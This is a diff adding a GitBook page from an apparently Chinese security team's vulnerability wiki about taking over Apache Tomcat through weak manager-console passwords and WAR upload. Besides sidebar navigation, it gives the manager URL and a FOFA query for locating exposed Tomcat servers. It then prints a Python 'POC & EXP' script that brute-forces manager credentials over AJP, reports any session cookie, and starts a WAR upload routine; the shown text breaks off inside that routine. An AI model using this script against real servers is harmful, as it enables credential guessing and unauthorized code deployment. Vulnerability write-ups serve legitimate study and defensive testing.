@@ -1,0 +1,1364 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Tomcat 管理后台弱口令导致的文件上传GetShell · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="BitWiki支持团队">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-codeblock-filename/block.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-insert-logo/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../SonarQube/" />
+    
+    
+    <link rel="prev" href="CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html" />
+    
+
+    <link href="https://wiki.1bit.win/doc/rss" title="BitWiki" rel="alternate" type="application/rss+xml" />
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"Bitwiki/bitwiki.github.io","types":["star","watch","fork"],"size":"small"};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://onebitsec.github.io/" target="_blank" class="custom-link">OneBit安全团队</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/BitWiki/bitwiki.github.io" target="_blank" class="custom-link">GitHub</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        <li class="header">杂七杂八</li>
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../../杂七杂八/工具推荐/">
+            
+                <a href="../../../杂七杂八/工具推荐/">
+            
+                    
+                    工具推荐
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../../杂七杂八/工具推荐/信息收集.html">
+            
+                <a href="../../../杂七杂八/工具推荐/信息收集.html">
+            
+                    
+                    信息收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../../杂七杂八/提交模板/">
+            
+                <a href="../../../杂七杂八/提交模板/">
+            
+                    
+                    提交模板
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../../杂七杂八/提交模板/漏洞文库模板.html">
+            
+                <a href="../../../杂七杂八/提交模板/漏洞文库模板.html">
+            
+                    
+                    漏洞文库模板
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">漏洞文库</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Apache
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../Log4j2/">
+            
+                <a href="../Log4j2/">
+            
+                    
+                    Log4j2
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1.1" data-path="../Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html">
+            
+                <a href="../Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html">
+            
+                    
+                    CVE 2021 44428  Log4j2  2.14.X 存在JNDI RCE漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    TomCat
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="CVE-2017-12615 Tomcat  存在PUT请求文件上传漏洞.html">
+            
+                <a href="CVE-2017-12615 Tomcat  存在PUT请求文件上传漏洞.html">
+            
+                    
+                    CVE 2017 12615 Tomcat  存在PUT请求文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.2" data-path="CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html">
+            
+                <a href="CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html">
+            
+                    
+                    CVE 2020 1938 Tomcat  存在AJP 文件包含漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.2.3" data-path="Tomcat 管理后台弱口令导致的文件上传GetShell.html">
+            
+                <a href="Tomcat 管理后台弱口令导致的文件上传GetShell.html">
+            
+                    
+                    Tomcat 管理后台弱口令导致的文件上传GetShell
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../SonarQube/">
+            
+                <a href="../../SonarQube/">
+            
+                    
+                    SonarQube
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html">
+            
+                <a href="../../SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html">
+            
+                    
+                    CVE 2020 27986 SonarQube 小于 8.4.2.X 存在API未授权访问漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">知识文库</li>
+        
+        
+    
+
+    
+        
+        <li class="header">赏金猎人</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    BugBountyTip
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >Tomcat 管理后台弱口令导致的文件上传GetShell</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#tomcat-&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;getshell"><b></b>Tomcat &#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;GetShell</a></li><ul><li><span class="title-icon "></span><a href="#0x00-&#x6F0F;&#x6D1E;&#x8BF4;&#x660E;"><b></b>0x00 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</a></li><li><span class="title-icon "></span><a href="#0x01-&#x5F71;&#x54CD;&#x7248;&#x672C;"><b></b>0x01 &#x5F71;&#x54CD;&#x7248;&#x672C;</a></li><li><span class="title-icon "></span><a href="#0x02-&#x6F0F;&#x6D1E;&#x6210;&#x56E0;"><b></b>0x02 &#x6F0F;&#x6D1E;&#x6210;&#x56E0;</a></li><li><span class="title-icon "></span><a href="#0x03-&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;"><b></b>0x03 &#x6F0F;&#x6D1E;&#x4EE3;&#x7801;</a></li><li><span class="title-icon "></span><a href="#0x04-&#x8BE6;&#x7EC6;&#x5206;&#x6790;"><b></b>0x04 &#x8BE6;&#x7EC6;&#x5206;&#x6790;</a></li><li><span class="title-icon "></span><a href="#0x05-&#x6F0F;&#x6D1E;&#x6307;&#x7EB9;"><b></b>0x05 &#x6F0F;&#x6D1E;&#x6307;&#x7EB9;</a></li><li><span class="title-icon "></span><a href="#0x06-poc--exp"><b></b>0x06 POC &amp; EXP</a></li><li><span class="title-icon "></span><a href="#0x07-&#x5229;&#x7528;&#x601D;&#x8DEF;"><b></b>0x07 &#x5229;&#x7528;&#x601D;&#x8DEF;</a></li><li><span class="title-icon "></span><a href="#0x08-&#x6269;&#x5C55;&#x94FE;&#x63A5;"><b></b>0x08 &#x6269;&#x5C55;&#x94FE;&#x63A5;</a></li><li><span class="title-icon "></span><a href="#0x9-&#x8054;&#x7CFB;&#x65B9;&#x5F0F;"><b></b>0x9 &#x8054;&#x7CFB;&#x65B9;&#x5F0F;</a></li></ul></ul></div><a href="#tomcat-&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;getshell" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="tomcat-&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;getshell"><a name="tomcat-&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;getshell" class="anchor-navigation-ex-anchor" href="#tomcat-&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;getshell"><i class="fa fa-link" aria-hidden="true"></i></a>Tomcat &#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5F31;&#x53E3;&#x4EE4;&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;GetShell</h1>
+<h2 id="0x00-&#x6F0F;&#x6D1E;&#x8BF4;&#x660E;"><a name="0x00-&#x6F0F;&#x6D1E;&#x8BF4;&#x660E;" class="anchor-navigation-ex-anchor" href="#0x00-&#x6F0F;&#x6D1E;&#x8BF4;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</h2>
+<p>Java &#x662F;&#x76EE;&#x524D; Web &#x5F00;&#x53D1;&#x4E2D;&#x6700;&#x4E3B;&#x6D41;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x800C; Tomcat &#x662F;&#x5F53;&#x524D;&#x6700;&#x6D41;&#x884C;&#x7684; Java &#x4E2D;&#x95F4;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x4E00;&#xFF0C;&#x4ECE;&#x521D;&#x7248;&#x53D1;&#x5E03;&#x5230;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6709;&#x4E8C;&#x5341;&#x591A;&#x5E74;&#x5386;&#x53F2;&#xFF0C;&#x5728;&#x4E16;&#x754C;&#x8303;&#x56F4;&#x5185;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x3002;</p>
+<p>&#x82E5;&#x662F;Tomcat&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x540E;&#x53F0;&#x4E0A;&#x4F20;&#x90E8;&#x7F72;war&#x5305; geshell</p>
+<h2 id="0x01-&#x5F71;&#x54CD;&#x7248;&#x672C;"><a name="0x01-&#x5F71;&#x54CD;&#x7248;&#x672C;" class="anchor-navigation-ex-anchor" href="#0x01-&#x5F71;&#x54CD;&#x7248;&#x672C;"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 &#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
+<p>&#x5168;&#x7248;&#x672C;</p>
+<h2 id="0x02-&#x6F0F;&#x6D1E;&#x6210;&#x56E0;"><a name="0x02-&#x6F0F;&#x6D1E;&#x6210;&#x56E0;" class="anchor-navigation-ex-anchor" href="#0x02-&#x6F0F;&#x6D1E;&#x6210;&#x56E0;"><i class="fa fa-link" aria-hidden="true"></i></a>0x02 &#x6F0F;&#x6D1E;&#x6210;&#x56E0;</h2>
+<ol>
+<li>&#x540E;&#x53F0;&#x5BC6;&#x7801;&#x4E3A;&#x5F31;&#x53E3;&#x4EE4;</li>
+<li>&#x7BA1;&#x7406;&#x9875;&#x9762;&#x672A;&#x8BBE;&#x7F6E;&#x8BBF;&#x63A7;</li>
+</ol>
+<h2 id="0x03-&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;"><a name="0x03-&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;" class="anchor-navigation-ex-anchor" href="#0x03-&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>0x03 &#x6F0F;&#x6D1E;&#x4EE3;&#x7801;</h2>
+<pre><code>http://&lt;target&gt;/manager/html
+</code></pre><h2 id="0x04-&#x8BE6;&#x7EC6;&#x5206;&#x6790;"><a name="0x04-&#x8BE6;&#x7EC6;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#0x04-&#x8BE6;&#x7EC6;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>0x04 &#x8BE6;&#x7EC6;&#x5206;&#x6790;</h2>
+<pre><code>https[:]//mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ
+
+http[:]//web.archive.org/web/20220313134342/https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ
+</code></pre><h2 id="0x05-&#x6F0F;&#x6D1E;&#x6307;&#x7EB9;"><a name="0x05-&#x6F0F;&#x6D1E;&#x6307;&#x7EB9;" class="anchor-navigation-ex-anchor" href="#0x05-&#x6F0F;&#x6D1E;&#x6307;&#x7EB9;"><i class="fa fa-link" aria-hidden="true"></i></a>0x05 &#x6F0F;&#x6D1E;&#x6307;&#x7EB9;</h2>
+<p>fofa:</p>
+<pre><code>app=&quot;Apache-Tomcat&quot;
+</code></pre><h2 id="0x06-poc--exp"><a name="0x06-poc--exp" class="anchor-navigation-ex-anchor" href="#0x06-poc--exp"><i class="fa fa-link" aria-hidden="true"></i></a>0x06 POC &amp; EXP</h2>
+<div><p class="code-filename">poc.py</p></div>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Julien Legras - Synacktiv</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># THIS SOFTWARE IS PROVIDED BY SYNACKTIV &apos;&apos;AS IS&apos;&apos; AND ANY</span>
+<span class="hljs-comment"># EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span>
+<span class="hljs-comment"># WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>
+<span class="hljs-comment"># DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY</span>
+<span class="hljs-comment"># DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span>
+<span class="hljs-comment"># (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;</span>
+<span class="hljs-comment"># LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND</span>
+<span class="hljs-comment"># ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT</span>
+<span class="hljs-comment"># (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</span>
+<span class="hljs-comment"># SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
+
+<span class="hljs-keyword">from</span> ajpy.ajp <span class="hljs-keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
+<span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint, pformat
+
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> logging
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> StringIO <span class="hljs-keyword">import</span> StringIO
+<span class="hljs-keyword">import</span> logging
+<span class="hljs-keyword">from</span> colorlog <span class="hljs-keyword">import</span> ColoredFormatter
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> unquote
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup_logger</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-string">&quot;&quot;&quot;Return a logger with a default ColoredFormatter.&quot;&quot;&quot;</span>
+    formatter = ColoredFormatter(
+        <span class="hljs-string">&quot;[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s&quot;</span>,
+        datefmt=<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,
+        reset=<span class="hljs-keyword">True</span>,
+        log_colors={
+            <span class="hljs-string">&apos;DEBUG&apos;</span>: <span class="hljs-string">&apos;bold_purple&apos;</span>,
+            <span class="hljs-string">&apos;INFO&apos;</span>: <span class="hljs-string">&apos;bold_green&apos;</span>,
+            <span class="hljs-string">&apos;WARNING&apos;</span>: <span class="hljs-string">&apos;bold_yellow&apos;</span>,
+            <span class="hljs-string">&apos;ERROR&apos;</span>: <span class="hljs-string">&apos;bold_red&apos;</span>,
+            <span class="hljs-string">&apos;CRITICAL&apos;</span>: <span class="hljs-string">&apos;bold_red&apos;</span>,
+        }
+    )
+
+    logger = logging.getLogger(<span class="hljs-string">&apos;meow&apos;</span>)
+    handler = logging.StreamHandler()
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+    logger.setLevel(logging.DEBUG)
+
+    <span class="hljs-keyword">return</span> logger
+
+
+logger = setup_logger()
+
+
+<span class="hljs-comment"># helpers</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prepare_ajp_forward_request</span><span class="hljs-params">(target_host, req_uri, method=AjpForwardRequest.GET)</span>:</span>
+    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
+    fr.method = method
+    fr.protocol = <span class="hljs-string">&quot;HTTP/1.1&quot;</span>
+    fr.req_uri = req_uri
+    fr.remote_addr = target_host
+    fr.remote_host = <span class="hljs-keyword">None</span>
+    fr.server_name = target_host
+    fr.server_port = <span class="hljs-number">80</span>
+    fr.request_headers = {
+        <span class="hljs-string">&apos;SC_REQ_ACCEPT&apos;</span>: <span class="hljs-string">&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;</span>,
+        <span class="hljs-string">&apos;SC_REQ_CONNECTION&apos;</span>: <span class="hljs-string">&apos;keep-alive&apos;</span>,
+        <span class="hljs-string">&apos;SC_REQ_CONTENT_LENGTH&apos;</span>: <span class="hljs-string">&apos;0&apos;</span>,
+        <span class="hljs-string">&apos;SC_REQ_HOST&apos;</span>: target_host,
+        <span class="hljs-string">&apos;SC_REQ_USER_AGENT&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0&apos;</span>,
+        <span class="hljs-string">&apos;Accept-Encoding&apos;</span>: <span class="hljs-string">&apos;gzip, deflate, sdch&apos;</span>,
+        <span class="hljs-string">&apos;Accept-Language&apos;</span>: <span class="hljs-string">&apos;en-US,en;q=0.5&apos;</span>,
+        <span class="hljs-string">&apos;Upgrade-Insecure-Requests&apos;</span>: <span class="hljs-string">&apos;1&apos;</span>,
+        <span class="hljs-string">&apos;Cache-Control&apos;</span>: <span class="hljs-string">&apos;max-age=0&apos;</span>
+    }
+    fr.is_ssl = <span class="hljs-keyword">False</span>
+
+    fr.attributes = []
+
+    <span class="hljs-keyword">return</span> fr
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tomcat</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, target_host, target_port)</span>:</span>
+        self.target_host = target_host
+        self.target_port = target_port
+
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
+        self.socket.connect((target_host, target_port))
+        self.stream = self.socket.makefile(<span class="hljs-string">&quot;rb&quot;</span>, bufsize=<span class="hljs-number">0</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_password</span><span class="hljs-params">(self, user, password)</span>:</span>
+        res = <span class="hljs-keyword">False</span>
+        stop = <span class="hljs-keyword">False</span>
+        self.forward_request.request_headers[<span class="hljs-string">&apos;SC_REQ_AUTHORIZATION&apos;</span>] = <span class="hljs-string">&quot;Basic &quot;</span> + (<span class="hljs-string">&quot;%s:%s&quot;</span> % (user, password)).encode(
+            <span class="hljs-string">&apos;base64&apos;</span>).replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;&apos;</span>)
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop:
+            logger.debug(<span class="hljs-string">&quot;testing %s:%s&quot;</span> % (user, password))
+            responses = self.forward_request.send_and_receive(self.socket, self.stream)
+            snd_hdrs_res = responses[<span class="hljs-number">0</span>]
+            <span class="hljs-keyword">if</span> snd_hdrs_res.http_status_code == <span class="hljs-number">404</span>:
+                <span class="hljs-keyword">raise</span> NotFoundException(<span class="hljs-string">&quot;The req_uri %s does not exist!&quot;</span> % self.req_uri)
+            <span class="hljs-keyword">elif</span> snd_hdrs_res.http_status_code == <span class="hljs-number">302</span>:
+                self.req_uri = snd_hdrs_res.response_headers.get(<span class="hljs-string">&apos;Location&apos;</span>, <span class="hljs-string">&apos;&apos;</span>)
+                logger.info(<span class="hljs-string">&quot;Redirecting to %s&quot;</span> % self.req_uri)
+                self.forward_request.req_uri = self.req_uri
+            <span class="hljs-keyword">elif</span> snd_hdrs_res.http_status_code == <span class="hljs-number">200</span>:
+                logger.info(<span class="hljs-string">&quot;Found valid credz: %s:%s&quot;</span> % (user, password))
+                res = <span class="hljs-keyword">True</span>
+                stop = <span class="hljs-keyword">True</span>
+                <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;Set-Cookie&apos;</span> <span class="hljs-keyword">in</span> snd_hdrs_res.response_headers:
+                    logger.info(<span class="hljs-string">&quot;Here is your cookie: %s&quot;</span> % (snd_hdrs_res.response_headers.get(<span class="hljs-string">&apos;Set-Cookie&apos;</span>, <span class="hljs-string">&apos;&apos;</span>)))
+            <span class="hljs-keyword">elif</span> snd_hdrs_res.http_status_code == <span class="hljs-number">403</span>:
+                logger.info(<span class="hljs-string">&quot;Found valid credz: %s:%s but the user is not authorized to access this resource&quot;</span> % (
+                    user, password))
+                stop = <span class="hljs-keyword">True</span>
+            <span class="hljs-keyword">elif</span> snd_hdrs_res.http_status_code == <span class="hljs-number">401</span>:
+                stop = <span class="hljs-keyword">True</span>
+
+        <span class="hljs-keyword">return</span> res
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_bruteforce</span><span class="hljs-params">(self, users, passwords, req_uri, autostop)</span>:</span>
+        logger.info(<span class="hljs-string">&quot;Attacking a tomcat at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))
+        self.req_uri = req_uri
+        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)
+
+        f_users = open(users, <span class="hljs-string">&quot;r&quot;</span>)
+        f_passwords = open(passwords, <span class="hljs-string">&quot;r&quot;</span>)
+
+        valid_credz = []
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> f_users:
+                f_passwords.seek(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+                <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> f_passwords:
+                    <span class="hljs-keyword">if</span> autostop <span class="hljs-keyword">and</span> len(valid_credz) &gt; <span class="hljs-number">0</span>:
+                        self.socket.close()
+                        <span class="hljs-keyword">return</span> valid_credz
+
+                    user = user.rstrip(<span class="hljs-string">&apos;\n&apos;</span>)
+                    password = password.rstrip(<span class="hljs-string">&apos;\n&apos;</span>)
+                    <span class="hljs-keyword">if</span> self.test_password(user, password):
+                        valid_credz.append((user, password))
+        <span class="hljs-keyword">except</span> NotFoundException <span class="hljs-keyword">as</span> e:
+            logger.fatal(e.message)
+        <span class="hljs-keyword">finally</span>:
+            logger.debug(<span class="hljs-string">&quot;Closing socket...&quot;</span>)
+            self.socket.close()
+            <span class="hljs-keyword">return</span> valid_credz
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">perform_request</span><span class="hljs-params">(self, req_uri, headers={}, method=<span class="hljs-string">&apos;GET&apos;</span>, user=None, password=None, attributes=[])</span>:</span>
+        self.req_uri = req_uri
+        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
+                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
+        logger.debug(<span class="hljs-string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))
+        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> password <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            self.forward_request.request_headers[<span class="hljs-string">&apos;SC_REQ_AUTHORIZATION&apos;</span>] = <span class="hljs-string">&quot;Basic &quot;</span> + (
+                    <span class="hljs-string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="hljs-string">&apos;base64&apos;</span>).replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;&apos;</span>)
+
+        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> headers:
+            self.forward_request.request_headers[h] = headers[h]
+
+        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> attributes:
+            self.forward_request.attributes.append(a)
+
+        responses = self.forward_request.send_and_receive(self.socket, self.stream)
+        print(responses)
+        <span class="hljs-keyword">if</span> len(responses) == <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>
+
+        snd_hdrs_res = responses[<span class="hljs-number">0</span>]
+
+        data_res = responses[<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>]
+        <span class="hljs-keyword">if</span> len(data_res) == <span class="hljs-number">0</span>:
+            logger.info(<span class="hljs-string">&quot;No data in response. Headers:\n %s&quot;</span> % pformat(vars(snd_hdrs_res)))
+
+        <span class="hljs-keyword">return</span> snd_hdrs_res, data_res
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">(self, filename, user, password, old_version, headers={})</span>:</span>
+        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
